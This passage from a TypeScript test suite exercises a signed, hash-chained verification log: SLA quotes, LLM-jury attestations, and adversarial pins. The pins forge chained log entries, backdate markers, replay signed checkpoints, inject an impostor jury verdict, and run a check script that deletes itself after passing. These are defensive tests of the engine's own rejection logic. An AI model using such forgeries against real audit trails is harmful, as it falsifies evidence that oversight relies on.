  assert.equal(ledger.skippedCount, outcome.report.unverified.length,
    'every skipped check shows in the ledger exactly once')
  assert.equal(ledger.decisiveCount, 0)
  assert.equal(ledger.cost, 0)
  assert.equal(ledger.confidencePurchased, null, 'nothing was purchased — the ledger says null, not zero')
  assert.equal(ledger.confidencePerDollar, null, 'a free run bought nothing per dollar')
  assert.equal(ledger.natsPerDollar, null)
})

test('v0.21: slaQuote prices a proven grade, records the full quote on chain, and replays deterministically', async () => {
  const fs = MemoryFs.of(project())
  const commands = new FakeCommands()
  const engine = makeEngine(fs, commands)
  const rate = { currency: 'USD' as const, computePerMs: 0.0001 }

  // M-03: a quote prices evidence that EXISTS. Before any verification the
  // chain carries no `proof/verified` marker at all — quoting a grade the
  // chain never reached is refused, whatever the caller asserts.
  await assert.rejects(
    () => engine.slaQuote({ grade: 'proven', confidence: 0.97, coverageAmount: 10_000, rate }),
    /no proof\/verified marker on this chain carries grade "proven"/,
  )
  assert.equal((await quoteMarkers(fs)).length, 0, 'a refused quote writes nothing')

  // The evidence: a green baseline and a green verify reach 'proven'.
  await engine.establishBaseline()
  await engine.verify({ changed: ['src/a.ts'] })

  const first = await engine.slaQuote({ grade: 'proven', confidence: 0.97, coverageAmount: 10_000, rate })
  assert.ok(first.marker === true, 'the return tags that the quote is on-chain')
  assert.equal(first.vehicle, 'dsh-proof/SLA-1')
  assert.equal(first.currency, 'USD')
  assert.equal(first.termsVersion, 'SLA-1')
  assert.equal(first.grade, 'proven')
  assert.equal(first.confidenceAtIssue, 0.97)
  if (first.decision.class !== 'offer') assert.fail(`expected an offer, got ${first.decision.class}`)
  assert.equal(first.decision.premium, 300, 'premium = coverage × P(undetected) = 10000 × 0.03, at the money spec')
  assert.equal(first.decision.pUndetected > 0, true)

  // The FULL quote is on the chain — pricing is auditable from its own bytes.
  const onChain = await quoteMarkers(fs)
  assert.equal(onChain.length, 1)
  const payload = onChain[0]
  assert.ok(payload)
  assert.equal(payload.quoteId, first.quoteId)
  assert.equal(payload.grade, 'proven')
  assert.deepEqual(payload.decision, first.decision)
  assert.deepEqual(payload.exclusions, first.exclusions)
  assert.equal(payload.confidenceAtIssue, 0.97)
  assert.equal(payload.termsVersion, 'SLA-1')

  // Same inputs mint the same quoteId — pricing is a pure function of its
  // inputs, so a re-quote is detectable as one, never mistaken for a re-price.
  const second = await engine.slaQuote({ grade: 'proven', confidence: 0.97, coverageAmount: 10_000, rate })
  assert.equal(second.quoteId, first.quoteId)

  // A grade the chain reached but the evidence turned against: make the
  // checks fail, verify (regressed marker on chain), and the regressed quote
  // is priced — a known loss underwrites nothing, which is the denial.
  commands.on(() => true, { exitCode: 1, output: 'boom' })
  await engine.verify({ changed: ['src/b.ts'] })
  const denied = await engine.slaQuote({ grade: 'regressed', coverageAmount: 10_000, rate })
  assert.equal(denied.decision.class, 'denied')

  // And a grade never reached is still refused even with evidence present.
  await assert.rejects(
    () => engine.slaQuote({ grade: 'stale', coverageAmount: 10_000, rate }),
    /no proof\/verified marker on this chain carries grade "stale"/,
  )
})

test('v0.21: slaQuote refuses malformed inputs at the boundary and writes nothing', async () => {
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())
  const goodRate = { currency: 'USD' as const, computePerMs: 0.0001 }

  await assert.rejects(
    engine.slaQuote({ grade: 'proven', coverageAmount: 10_000, rate: { ...goodRate, computePerMs: -0.001 } }),
    /rate\.computePerMs/,
  )
  await assert.rejects(
    engine.slaQuote({ grade: 'wat' as unknown as ProofGrade, coverageAmount: 10_000, rate: goodRate }),
    /grade must be one of/,
  )
  await assert.rejects(
    engine.slaQuote({ grade: 'proven', confidence: 1.5, coverageAmount: 10_000, rate: goodRate }),
    /confidence/,
  )
  await assert.rejects(
    engine.slaQuote({ grade: 'proven', coverageAmount: 10_000, rate: { ...goodRate, humanReviewPerItem: -1 } }),
    /rate\.humanReviewPerItem/,
  )
  // A refused quote leaves the chain untouched.
  assert.equal((await quoteMarkers(fs)).length, 0)

  // The same defense guards the verify seam: a negative price card refuses
  // the run before any check executes.
  await assert.rejects(
    engine.verify({ changed: ['src/a.ts'], economics: { rate: { currency: 'USD', computePerMs: -1 } } }),
    /rate\.computePerMs/,
  )
})

test('v0.21: verifyContract (machine path) carries economics with the final confidence as posterior', async () => {
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())
  await engine.establishBaseline()
  const outcome = await engine.verifyContract({
    contract: { kind: 'behavior-preserving', claim: 'the refactor changes nothing observable' },
    changed: ['src/a.ts'],
    economics: { rate: { currency: 'USD', computePerMs: 0.001 } },
  })
  assert.ok(outcome.economics)
  // Whole-batch regime: no scheduler prior product exists; the posterior is
  // the FINAL confidence the verdict rode on (this is where attestation
  // fusion would have applied — none is active on this chain).
  assert.equal(outcome.economics.priorProbability, null)
  assert.equal(outcome.economics.posteriorProbability, outcome.report.confidence)
  assert.equal(outcome.economics.ledger.computeMs, 10, 'two checks at the fake port default 5ms')
  assert.equal(outcome.economics.ledger.decisiveCount, 2)
  assert.equal(outcome.economics.ledger.humanReviewItems, 0)
  // Without the option, the contract outcome keeps its pre-v0.21 shape.
  const plain = await engine.verifyContract({
    contract: { kind: 'behavior-preserving', claim: 'the refactor changes nothing observable' },
    changed: ['src/a.ts'],
  })
  assert.ok(!('economics' in plain))
})

test('v0.21: an llm-jury verdict prices the testimony it consumed', async () => {
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())
  const claim = 'the retry loop no longer swallows lock timeouts'
  // One active Class B witness for the claim — seeded exactly as the attest
  // tooling writes it (the marker payload IS the attestation).
  await engine.storeView.mark('attest/jury', {
    kind: 'attest/jury',
    claimId: claimIdOf(claim),
    gen: 0,
    prompt: 'deliberate on the claim against the given context',
    rubricVersion: 'jury-rubric/v1',
    model: 'test-juror/v1',
    independence: 'fresh-context',
    verdict: 'uphold',
    probability: 0.99,
    output: '{"verdict":"uphold","probability":0.99}',
    at: 1_700_000_000_000,
  })
  const outcome = await engine.verifyContract({
    contract: { kind: 'llm-jury', claim },
    economics: { rate: { currency: 'USD', computePerMs: 0.001, humanReviewPerItem: 2 } },
  })
  assert.ok(outcome.economics)
  assert.equal(outcome.economics.ledger.computeMs, 0, 'no command ever ran on the jury path')
  assert.equal(outcome.economics.ledger.humanReviewItems, 1, 'the active jury witness is what this verdict consumed')
  assert.equal(outcome.economics.ledger.cost, 2, 'one review item × $2 — the testimony is the whole bill')
  assert.equal(outcome.economics.priorProbability, null)
  assert.equal(outcome.economics.posteriorProbability, null, 'testimony arithmetic is not a scheduler posterior')
})

// -- v0.24: fourth-round audit adversarial pins (Y-H-01/02/05/15/16/17) ----------
//
// The v0.23 survey's meta-finding: the fixes were pinned on their HONEST half
// only — epoch drift against real markers, audit.ok consumed on one axis,
// self-deleting scripts never run. These pins are the adversarial halves.

test('v0.24 (Y-H-02): signer adoption — one refusal, then the documented re-anchor actually recovers', async () => {
  const fs = MemoryFs.of(project())
  // The unsigned era: an honest workspace anchored without a key.
  const unsigned = makeEngine(fs, new FakeCommands())
  await unsigned.establishBaseline()
  assert.equal((await unsigned.audit()).chain.mode, 'unsigned')

  // Adopt a signer (the "add trustDir to a running deployment" migration).
  // The first boundary under the key refuses ONCE — the pre-sign audit will
  // not lend the key over the unsigned era's baseline markers. By design.
  const adopted = delegatingEngine(fs, new FakeCommands())
  const first = await adopted.verify({ changed: ['src/a.ts'] })
  assert.ok(first.report.grade !== 'proven', 'the adoption window mints no proven')
  const afterAdoption = await adopted.audit()
  assert.equal(afterAdoption.chain.refusedToSign?.length, 1,
    'the adoption window takes exactly one refusal')

  // THE v0.23 bug (V2-H-2): the DOCUMENTED recovery (`establishBaseline`
  // re-anchor) minted a SECOND refusal of its own — saveBaseline checkpointed
  // before the established marker, the pre-sign audit saw the PREVIOUS
  // process's established line as newest, refused again — and `audit.ok`
  // never forgave either line, so the workspace could never mint proven
  // again. v0.24: the reorder (established marker before the anchor's first
  // checkpoint) plus the store's generational billing — the recovery signs,
  // mints no second refusal, and ok returns to true.
  await adopted.establishBaseline()
  const healed = await adopted.audit()
  assert.equal(healed.chain.refusedToSign?.length, 1,
    'the recovery mints NO second refusal line — the engine no longer accuses itself')
  assert.equal(healed.ok, true, 'the healed chain passes its own audit again')

  const recovered = await adopted.verify({ changed: ['src/a.ts'] })
  assert.equal(recovered.report.grade, 'proven', 'the recovered chain certifies again — recovery is real, not documentation')
  assert.equal(recovered.auditFailed, undefined)
  assert.equal(recovered.baselineAbsorptionSuspect, undefined)
})

test('v0.24 (Y-H-16): audit.ok is consumed by all four verdict paths — refusedToSign axis', async () => {
  // One engineered chain, one axis: a chained, well-formed checkpoint line
  // carrying the SIG_REFUSED banner (the store accusing its own log — the
  // strongest ok-failing signal the audit has, and the axis the v0.23 pins
  // never triggered). Every verdict path must cap on it.
  const fs = MemoryFs.of(project())
  const engine = makeEngine(fs, new FakeCommands())
  await engine.establishBaseline()
  const green = await engine.verify({ changed: ['src/a.ts'] })
  assert.equal(green.report.grade, 'proven', 'fixture: the chain is green before the refusal lands')

  const logPath = `${ROOT}/.proof/evidence.jsonl`
  const lines = ((await fs.readFile(logPath)) ?? '').split('\n').filter(l => l.trim().length > 0)
  const tail = lines[lines.length - 1] as string
  const records = lines.filter(l => {
    try {
      const parsed = JSON.parse(l) as { kind?: unknown }
      return parsed?.kind === 'evidence' || parsed?.kind === 'marker'
    } catch { return false }
  }).length
  await fs.appendLine(logPath, JSON.stringify({
    v: 2,
    kind: 'checkpoint',
    at: '2026-10-06T00:00:00.000Z',
    prev: lineDigest(tail),
    payload: { count: records, head: lineDigest(tail), workspaceKey: 'default', at: '2026-10-06T00:00:00.000Z' },
    sigError: `${SIG_REFUSED_PREFIX}: fixture — the refusedToSign axis`,
    keyId: 'ws-key',
  }))
  assert.equal((await engine.audit()).chain.refusedToSign?.length, 1, 'fixture: the refusal line is charged')
  assert.equal((await engine.audit()).ok, false)

  // Path 1/4 — plain verify: a would-be-proven run caps at stale.
  const v = await engine.verify({ changed: ['src/a.ts'] })
  assert.equal(v.auditFailed, true, 'the outcome carries the audit failure')
  assert.equal(v.report.grade, 'stale', 'verify caps proven at stale while the chain fails its own audit')

  // Path 2/4 — verifyContract docs-only: the jury report caps too.
  const docs = await engine.verifyContract({ contract: { kind: 'docs-only', claim: 'the docs are the change' } })
  assert.equal(docs.auditFailed, true)
  assert.equal(docs.report.grade, 'stale', 'docs-only caps proven at stale')

  // Path 3/4 — verifyContract machine path.
  const machine = await engine.verifyContract({
    changed: ['src/a.ts'],
    contract: { kind: 'behavior-preserving', claim: 'internal refactor only' },
  })
  assert.equal(machine.auditFailed, true)
  assert.equal(machine.report.grade, 'stale', 'the machine path caps proven at stale')

  // Path 4/4 — verifyContract llm-jury: even an upholding 0.99 witness
  // cannot certify over a chain that failed its own audit.
  const claim = 'the retry loop honours cancellation'
  await seedJuryAttestation(engine, claim, { gen: 0, verdict: 'uphold', probability: 0.99 })
  const jury = await engine.verifyContract({ contract: { kind: 'llm-jury', claim } })
  assert.equal(jury.auditFailed, true)
  assert.equal(jury.report.grade, 'stale', 'llm-jury refuses to certify over a failed audit')
})

test('v0.24 (Y-H-15a): a forged drift marker with an early `at` moves no boundary — position is the only clock', async () => {
  // The X-H-01 attack shape, adversarial half: an out-of-band
  // `proof/verified` marker carrying scriptDrift and a BACKDATED timestamp.
  // v0.23 closed the marker channel by position — this pin holds the door
  // shut against the strongest form of the forger (correct headRef, any at).
  const fs = MemoryFs.of(driftProject())
  const engine = driftEngine(fs, new FakeCommands(), { certifyTarget: undefined })
  await engine.establishBaseline()
  fs.mutate(`${ROOT}/packages/a/package.json`, JSON.stringify({ name: 'a', scripts: { test: 'node -e ""' } }))
  const detected = await engine.verify({ changed: ['packages/b/src/b.ts'] })
  assert.equal(detected.report.grade, 'stale', 'fixture: drift is detected and priced cold')

  // The forged marker: correctly chained, headRef computed exactly as the
  // honest writer would, `at` backdated into the previous body's green era.
  const logPath = `${ROOT}/.proof/evidence.jsonl`
  const lines = ((await fs.readFile(logPath)) ?? '').split('\n').filter(l => l.trim().length > 0)
  const tail = lines[lines.length - 1] as string
  await fs.appendLine(logPath, JSON.stringify({
    v: 2,
    kind: 'marker',
    at: '2020-01-01T00:00:00.000Z',
    prev: lineDigest(tail),
    payload: {
      label: 'proof/verified',
      grade: 'stale',
      root: detected.report.root,
      changed: 1,
      scriptDrift: [detected.scriptDrift?.[0] ?? 'test'],
      headRef: lineDigest(tail),
    },
  }))

  const after = await engine.verify({ changed: ['packages/b/src/b.ts'] })
  assert.equal(after.report.grade, 'stale',
    'a forged drift marker — even position-correct — cannot unlock the previous body\'s green history')
  assert.ok(after.report.confidence !== undefined && after.report.confidence < 0.97,
    `confidence stays under the target (got ${after.report.confidence}) — the boundary admits nothing`)
})

test('v0.24 (Y-H-15b): body-swap loops, both shapes — a new body inherits nothing', async () => {
  // Shape 1 — INTRA-epoch swap: drift to vacuous body B1, run green
  // repeatedly, then swap to B2. The v0.23 first-seen boundary let B2
  // inherit every green B1 earned (V3-M1); the last-seen boundary admits
  // nothing either body did not earn after its own newest marker.
  const fs = MemoryFs.of(driftProject())
  const engine = driftEngine(fs, new FakeCommands(), { certifyTarget: undefined })
  await engine.establishBaseline()
  const bodyA = 'node -e ""'
  const bodyB = 'node -e " "'
  fs.mutate(`${ROOT}/packages/a/package.json`, JSON.stringify({ name: 'a', scripts: { test: bodyA } }))
  for (let i = 0; i < 6; i += 1) {
    const run = await engine.verify({ changed: ['packages/b/src/b.ts'] })
    assert.equal(run.report.grade, 'stale', `B1 pass #${i + 1} accumulates nothing while drifted`)
  }
  fs.mutate(`${ROOT}/packages/a/package.json`, JSON.stringify({ name: 'a', scripts: { test: bodyB } }))
  const swapped = await engine.verify({ changed: ['packages/b/src/b.ts'] })
  assert.equal(swapped.report.grade, 'stale',
    'B2\'s first pass certifies nothing — B1\'s green history died with B1 (last-seen boundary)')
  assert.ok(swapped.report.confidence !== undefined && swapped.report.confidence < 0.97)

  // Shape 2 — CROSS-epoch loop: re-anchor B2, drift to B3, re-anchor, …
  // Each fresh anchor resets the epoch; B3 starts at zero, never at B2's
  // post-anchor green (X-H-19's loop, adversarial half).
  await engine.establishBaseline() // locks B2
  const locked = await engine.verify({ changed: ['packages/b/src/b.ts'] })
  assert.equal(locked.report.grade, 'proven', 'fixture: the anchored B2 is ordinarily certified')

  fs.mutate(`${ROOT}/packages/a/package.json`, JSON.stringify({ name: 'a', scripts: { test: bodyA } }))
  const b3First = await engine.verify({ changed: ['packages/b/src/b.ts'] })
  assert.ok(b3First.scriptDrift !== undefined && b3First.scriptDrift.length === 1, 'fixture: B3 is detected as drift')
  assert.equal(b3First.report.grade, 'stale',
    'the new generation prices cold — B2\'s post-anchor green stays on the other side of the epoch floor')
  assert.ok(b3First.report.confidence !== undefined && b3First.report.confidence < 0.97)
})

test('v0.24 (Y-H-17): a self-deleting conjured script — error record, no synthetic meta, require-tier blind', async () => {
  // X-H-05's adversarial half, never pinned: the script passes, then deletes
  // itself — the re-dispatch cannot re-read the body it is about to vouch
  // for. Three assertions: the chain carries the honest ERROR record, the
  // record claims no synthetic body, and the require tier does not accept
  // its "coverage".
  const root = join(CONJURE_ROOT, 'self-delete')
  await makeConjureWorkspace(root)
  const claim = 'feature is sound'
  // One organic check anchors the baseline — over a DIFFERENT file, so the
  // only thing that could cover src/feature.ts is the conjured check.
  const engine = conjureEngine(root, {
    checks: [{ label: 'other tests', command: ['node', '-e', 'process.exit(0)'], kind: 'test', paths: ['src/other.ts'] }],
    coverage: 'require',
  })
  await fsp.writeFile(join(root, 'src/other.ts'), 'export const other = 1\n')
  try {
    await engine.establishBaseline()
    const { request } = await engine.conjureRequest({ claim, paths: ['src/feature.ts'] })
    // The self-deleting script: real assertion, honest PASS line, then the
    // deterministic self-delete (`rmSync(new URL(import.meta.url))` — the
    // X-H-05 exploit shape in its URL-object spelling, which Windows accepts;
    // node:fs is not a forbidden capability).
    await fsp.writeFile(join(root, '.proof-synthetic', request.entry), [
      "import { rmSync } from 'node:fs'",
      "const check = (ok, msg) => { if (!ok) { console.error('SYNTHETIC: FAIL ' + msg); process.exit(1) } }",
      'check(1 + 1 === 2, "1+1===2")',
      "console.log('SYNTHETIC: PASS')",
      'rmSync(new URL(import.meta.url))',
      '',
    ].join('\n'))
    const run = await engine.conjureRun({ claim, entry: request.entry })
    assert.equal(run.status, 'pass', 'fixture: the script honestly passed before deleting itself')
    assert.equal(await engine.fsView.readFile(join(root, '.proof-synthetic', request.entry)), undefined,
      'fixture: the script is gone from disk')

    const outcome = await engine.verify({ changed: ['src/feature.ts'] })
    // 1 — the error record: the re-dispatch cannot vouch for a body it
    // cannot read, and says so on the record's own first line.
    const latest = (await engine.latestEvidence()).get(run.checkId)
    assert.ok(latest, 'the conjured check was re-dispatched')
    assert.equal(latest?.status, 'error', 'a self-deleting pass is not a pass')
    assert.match(latest?.outputHead ?? '', /vanished/, 'the record names why it cannot be believed')
    // 2 — pool honesty: no synthetic meta attaches — there are no bytes
    // left to pin, and a fabricated digest would re-open the field-keyed
    // interested-party hole X-H-05 closed.
    assert.equal((latest as { synthetic?: unknown } | undefined)?.synthetic, undefined,
      'the vanished run claims no script body')
    // 3 — the require tier: the vanished script's "coverage" buys nothing.
    assert.notEqual(outcome.report.grade, 'proven',
      'require does not accept execution cover from a check whose body evaporated')
  } finally {
    await fsp.rm(root, { recursive: true, force: true })
  }
})

test('v0.24 (Y-H-01): a transplanted checkpoint never reaches the public log — layered selection + predicate', async () => {
  const fs = MemoryFs.of(project())
  const engine = publishingEngine(fs)
  await engine.establishBaseline()
  const honest = await engine.publishCheckpoint()
  assert.equal(honest.duplicate, false, 'fixture: the honest chain publishes')

  // The transplant: replay the FIRST signed checkpoint (an earlier, honest
  // signature whose payload names an earlier head) at the tail — a genuine
  // signature now sitting at a position its own payload.head does not
  // corroborate. v0.23 selected "the last signed checkpoint" verbatim and
  // would have minted a NEW leaf for the liar (the tree grows on a replay).
  // v0.24 layers: the store's selection excludes head liars (G2), the
  // engine's publish predicate re-checks the selected one — so the publish
  // mirrors the honest checkpoint and the tree does not grow.
  const logPath = `${ROOT}/.proof/evidence.jsonl`
  const lines = ((await fs.readFile(logPath)) ?? '').split('\n').filter(l => l.trim().length > 0)
  let transplant = ''
  for (const line of lines) {
    try {
      const parsed = JSON.parse(line) as { kind?: unknown; sig?: unknown }
      if (parsed?.kind === 'checkpoint' && typeof parsed.sig === 'string') {
        transplant = line // FIRST signed checkpoint — an earlier head than the final one
        break
      }
    } catch { /* keep walking */ }
  }
  assert.ok(transplant.length > 0, 'fixture: a signed checkpoint exists to transplant')
  const replayed = JSON.parse(transplant) as Record<string, unknown>
  await fs.appendLine(logPath, JSON.stringify({
    ...replayed,
    prev: lineDigest(lines[lines.length - 1] as string),
  }))
  // Fixture check: the transplanted line IS a head liar under the walk.
  const audit = await engine.audit()
  assert.ok(audit.chain.headMismatches.length > 0, 'the transplant lies about its position')

  const second = await engine.publishCheckpoint()
  assert.equal(second.duplicate, true,
    'the transplanted liar is never selected for publication — the honest checkpoint is, again')
  assert.equal(second.treeSize, honest.treeSize, 'the public tree does not grow on a replayed signature')
  assert.equal(second.leafHash, honest.leafHash)
})

test('v0.24 (Y-H-05): forged evidence rows above the last verified checkpoint never reach the priors', async () => {
  // The evidence channel's adversarial half: ~10 self-addressed, correctly
  // chained green rows appended above the last signed checkpoint. v0.23
  // admitted them as history wholesale (only the marker channel was
  // position-aware); v0.24's vouched floor excludes them — byte-identically:
  // the confidence a run reaches with the forged tail equals the one the
  // same run reaches on the clean chain.
  const forgedSpec = spec({ id: 'npm run --silent test' })
  const forgedClock = { now: () => 1_700_000_000_000 }
  const buildHistory = async (): Promise<{ fs: MemoryFs; engine: ProofEngine; logPath: string }> => {
    const fs = MemoryFs.of(project())
    const engine = new ProofEngine({
      root: ROOT,
      fs,
      commands: new FakeCommands(),
      workspace: new FakeWorkspace(ROOT),
      clock: new FakeClock(),
      workspaceKey: 'ws',
      signer: () => Promise.resolve(new FakeKey('ws-key')),
      impactGraphLimit: 1_000,
    })
    await engine.establishBaseline()
    await engine.verify({ changed: ['src/a.ts'] })
    return { fs, engine, logPath: `${ROOT}/.proof/evidence.jsonl` }
  }
  const clean = await buildHistory()
  const attacked = await buildHistory()

  // The out-of-band tail on the attacked chain: ten green rows, each
  // correctly chained and self-addressing — the exact shape that used to
  // lift a synthetic-tier single pass past the certify target.
  const lines = ((await attacked.fs.readFile(attacked.logPath)) ?? '').split('\n').filter(l => l.trim().length > 0)
  let prev = lineDigest(lines[lines.length - 1] as string)
  const forgedWorkspace = snapshotWorkspace('abc123', [])
  for (let i = 0; i < 10; i += 1) {
    const record = makeEvidence(
      forgedSpec,
      { status: 'pass', exitCode: 0, durationMs: 5, output: 'ok\n' },
      forgedWorkspace,
      forgedClock,
    )
    const line = JSON.stringify({
      v: 2, kind: 'evidence', at: new Date(forgedClock.now()).toISOString(), prev, payload: record,
    })
    await attacked.fs.appendLine(attacked.logPath, line)
    prev = lineDigest(line)
  }

  const cleanRun = await clean.engine.verify({ changed: ['src/a.ts'] })
  const attackedRun = await attacked.engine.verify({ changed: ['src/a.ts'] })
  assert.equal(attackedRun.report.confidence, cleanRun.report.confidence,
    'the forged tail contributes exactly nothing to the priors — the vouched floor is absolute')
  assert.equal(attackedRun.report.grade, cleanRun.report.grade)
  assert.equal(attackedRun.auditFailed, undefined, 'the forged rows also fail no audit axis — the exclusion is the only defense')
})

// -- v0.25 (K1): the vouched floor everywhere — pattern 5, the shape-legal append --

/**
 * The one append helper every K1 test shares: an out-of-band marker line,
 * CORRECTLY CHAINED — `prev` and (for protected labels) `headRef` both the
 * digest of the physical predecessor, so the line passes every structural
 * check the suspect position test has and reads back NON-suspect. This is
 * pattern 5's exact shape: the writer did nothing a hash chain can detect;
 * only the vouched floor (the content sits above the last checkpoint this
 * host's key verified) can refuse it.
 */
async function appendChainedMarker(
  fs: MemoryFs, logPath: string, payload: Record<string, unknown>,
): Promise<void> {
  const lines = ((await fs.readFile(logPath)) ?? '').split('\n').filter(l => l.trim().length > 0)
  const prev = lineDigest(lines[lines.length - 1] as string)
  await fs.appendLine(logPath, JSON.stringify({
    v: 2,
    kind: 'marker',
    at: '2026-10-06T00:00:00.000Z',
    prev,
    payload: { ...payload, headRef: prev },
  }))
}

/** The signed-engine shape every K1 test runs on: a host key that vouches, so a floor exists. */
function flooredContractEngine(fs: MemoryFs, logger?: (message: string) => void) {
  return new ProofEngine({
    root: ROOT,
    fs,
    commands: new FakeCommands(),
    workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(),
    workspaceKey: 'ws',
    signer: () => Promise.resolve(new FakeKey('ws-key')),
    impactGraphLimit: 1_000,
    ...(logger !== undefined ? { verbose: true, logger } : {}),
  })
}

test('v0.25 (K1): an out-of-band attest marker above the vouched floor prices nothing — κ starves, the count stays visible', async () => {
  // (a) of the floor trio. One honest gen-0 uphold sits BELOW the floor
  // (covered by delegateTask's boundary checkpoint); a gen-1 reject @0.99
  // twin — correctly chained, headRef honest, everything the suspect test
  // checks is green — rides ABOVE it. v0.24's κ fusion read the whole
  // non-suspect pool, so the twin won the appeal race (highest gen) and
  // collapsed the claim one append after the last verified checkpoint. The
  // floor refuses it; the boundary marker NAMES it.
  const build = async (): Promise<{ fs: MemoryFs; engine: ProofEngine; logPath: string }> => {
    const fs = MemoryFs.of(surfaceProject())
    const engine = flooredContractEngine(fs)
    await engine.establishBaseline()
    return { fs, engine, logPath: `${ROOT}/.proof/evidence.jsonl` }
  }
  const clean = await build()
  const attacked = await build()
  const claim = 'the retry loop honours cancellation'
  for (const { engine } of [clean, attacked]) {
    await seedJuryAttestation(engine, claim, { gen: 0, verdict: 'uphold', probability: 0.99 })
    // The cheapest boundary verb that closes a checkpoint window over the
    // honest witness (every delegation verb checkpoints — X-H-04).
    await engine.delegateTask({ claim: 'unrelated obligation, opened to close the window' })
  }
  await appendChainedMarker(attacked.fs, attacked.logPath, {
    label: 'attest/jury',
    kind: 'attest/jury',
    claimId: claimIdOf(claim),
    gen: 1,
    prompt: 'impostor deliberation',
    rubricVersion: 'jury-rubric/v1',
    model: 'impostor-model',
    independence: 'fresh-context',
    verdict: 'reject',
    probability: 0.99,
    output: '{"verdict":"reject","probability":0.99}',
    at: 1_767_225_600_000,
  })

  const cleanRun = await clean.engine.verifyContract({ contract: { kind: 'llm-jury', claim } })
  const attackedRun = await attacked.engine.verifyContract({ contract: { kind: 'llm-jury', claim } })
  assert.equal(attackedRun.report.confidence, cleanRun.report.confidence,
    'the above-floor twin contributed exactly nothing to the fusion — 0.99^0.7 either way')
  assert.equal(attackedRun.report.grade, cleanRun.report.grade)
  assert.equal(attackedRun.report.grade, 'proven', 'the honest gen-0 witness still certifies')
  assert.equal(attackedRun.auditFailed, undefined, 'the twin broke no audit axis — the floor is the only defense')
  assert.equal(attackedRun.contract.attestations?.length, 1, 'only the honest witness is summary-visible')
  assert.equal(attackedRun.contract.attestations?.[0]?.gen, 0, 'the twin never entered the appeal race')
  // Visible counting, never silent eviction: the boundary marker carries
  // the withheld count; the clean chain mints no such field at all.
  assert.ok(attacked.fs.log.some(l => l.includes('"claim/jury"') && l.includes('"aboveFloorAttestations":1')),
    'the boundary marker names the one marker riding above the floor')
  assert.ok(!clean.fs.log.some(l => l.includes('"aboveFloorAttestations"')),
    'an honest chain (everything below the floor) mints no above-floor field')
})

test('v0.25 (K1): a fake drift marker above the vouched floor cannot move the epoch boundary', async () => {
  // (c) of the floor trio. The drift epoch boundary is the LAST verified
  // proof/verified marker carrying the id in scriptDrift; a fake one
  // appended above the floor used to enter the pool (correctly chained ⇒
  // non-suspect) and re-cut the boundary by position. V3-M1's last-wins
  // semantics already made the re-cut conservative (a higher boundary only
  // starves the drifted id further), so this pin is the invariant
  // regression: clean and attacked chains must agree byte-for-byte on the
  // number — the fake may not move the boundary in EITHER direction, and
  // the verbose narrative says it was seen.
  const build = async (): Promise<{ fs: MemoryFs; engine: ProofEngine; logPath: string; warnings: string[] }> => {
    const fs = MemoryFs.of(driftProject())
    const commands = new FakeCommands()
    commands.on(() => true, { exitCode: 0, output: 'green' })
    const warnings: string[] = []
    const engine = new ProofEngine({
      root: ROOT,
      fs,
      commands,
      workspace: new FakeWorkspace(ROOT),
      clock: new FakeClock(),
      workspaceKey: 'ws',
      signer: () => Promise.resolve(new FakeKey('ws-key')),
      impactGraphLimit: 1_000,
      verbose: true,
      logger: m => warnings.push(m),
    })
    await engine.establishBaseline()
    return { fs, engine, logPath: `${ROOT}/.proof/evidence.jsonl`, warnings }
  }
  const clean = await build()
  const attacked = await build()
  // Both chains drift package a's test body to a vacuous script (identical
  // verb counts, so the chains stay byte-comparable).
  let driftedId = ''
  for (const side of [clean, attacked]) {
    side.fs.mutate(`${ROOT}/packages/a/package.json`, JSON.stringify({ name: 'a', scripts: { test: 'node -e ""' } }))
    const detection = await side.engine.verify({ changed: ['packages/b/src/b.ts'] })
    assert.ok(detection.scriptDrift !== undefined && detection.scriptDrift.length === 1,
      'fixture: the drift is on the record below the floor')
    driftedId = detection.scriptDrift?.[0] ?? ''
  }
  assert.ok(driftedId.length > 0, 'fixture: the drifted id is known')
  // The fake: a drift marker for the same id, appended above the floor,
  // claiming a generational cut nobody made.
  await appendChainedMarker(attacked.fs, attacked.logPath, {
    label: 'proof/verified',
    grade: 'stale',
    claim: 'fake generational cut',
    scriptDrift: [driftedId],
  })
  const cleanRun = await clean.engine.verify({ changed: ['packages/b/src/b.ts'] })
  const attackedRun = await attacked.engine.verify({ changed: ['packages/b/src/b.ts'] })
  assert.equal(attackedRun.report.confidence, cleanRun.report.confidence,
    'the fake marker moved the epoch boundary not at all — same priors, same number')
  assert.equal(attackedRun.report.grade, cleanRun.report.grade)
  assert.ok(attacked.warnings.some(w => w.includes('ride above the last verified checkpoint')),
    'the withheld drift marker is narrated, not silently dropped')
})

test('v0.25 (V4-M6): a forged tail twin no longer vetoes the publish — the newest verifiable checkpoint publishes, the twin lands on the record', async () => {
  // The publish DoS: ONE appended checkpoint line — well-formed, own keyId,
  // garbage signature, honest count and head — flipped bestCheckpoint to
  // `refuted` and held the whole verb hostage (v0.24 refused the publish
  // outright; every honest checkpoint below the twin was unpublishable).
  // The fallback selects through `selectPublishable`, the same predicate
  // the ptl CLI face uses: newest → oldest, first VERIFIABLE wins.
  const fs = MemoryFs.of(project())
  const engine = publishingEngine(fs)
  await engine.establishBaseline()
  await engine.verify({ changed: ['src/a.ts'] })
  const logPath = `${ROOT}/.proof/evidence.jsonl`
  const lines = ((await fs.readFile(logPath)) ?? '').split('\n').filter(l => l.trim().length > 0)
  const recordsBefore = lines.filter(l => {
    try {
      const kind = (JSON.parse(l) as { kind?: unknown }).kind
      return kind === 'evidence' || kind === 'marker'
    } catch { return false }
  }).length
  const prev = lineDigest(lines[lines.length - 1] as string)
  await fs.appendLine(logPath, JSON.stringify({
    v: 2,
    kind: 'checkpoint',
    at: '2026-10-06T00:00:00.000Z',
    prev,
    // count/head honest for the position: well-formed and NOT a head liar,
    // so the only thing wrong with this line is the signature — the exact
    // `refuted` twin the positional-last selection cannot see past.
    payload: { count: recordsBefore, head: prev, workspaceKey: 'ws', at: '2026-10-06T00:00:00.000Z' },
    sig: 'sig:ws-key:forged-garbage',
    keyId: 'ws-key',
  }))

  // v0.24: rejecting here was the bug — one bad line, every honest
  // checkpoint below it held hostage. v0.25: the publish succeeds.
  const published = await engine.publishCheckpoint()
  assert.equal(published.duplicate, false)
  const { log } = await loadPtl(fs, PTL_DIR)
  assert.equal(log.size, 1, 'the forged twin minted no leaf of its own')
